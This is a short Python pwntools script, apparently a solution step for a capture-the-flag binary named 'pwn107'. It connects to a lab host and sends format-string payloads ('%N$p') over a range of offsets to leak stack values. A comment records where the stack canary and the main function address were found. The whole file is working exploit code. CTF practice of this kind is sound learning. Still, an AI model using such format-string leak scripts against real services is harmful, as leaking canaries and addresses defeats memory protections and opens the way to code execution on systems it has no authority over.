#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './pwn107.pwn107'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'warn'
host = '10.10.209.117'
port = 9007


# =========================================================
#                           FUZZ
# =========================================================

for i in range(0, 30): # Range is obtained by fuzzing locally 
    try:
        # Connect to server
        io = remote(host, port)
        # io = process(exe)
        # Format the payload to location on stack
        io.sendlineafter(b'last streak?', f'%{i}$p'.encode())
        # receive unneccesary lines 
        io.recvuntil(b'Your current streak: ')
        # receive leaked
        leak = io.recvline()
        # ignore nulls
        if not b'(nil)' in leak:
            # print value if exist
            print(f'stack at-{i}' + ": " + str(leak)) # Canary found at %13$p, Main Address local at %17$p remote at %19$p
        io.close()
    except EOFError:
        io.close()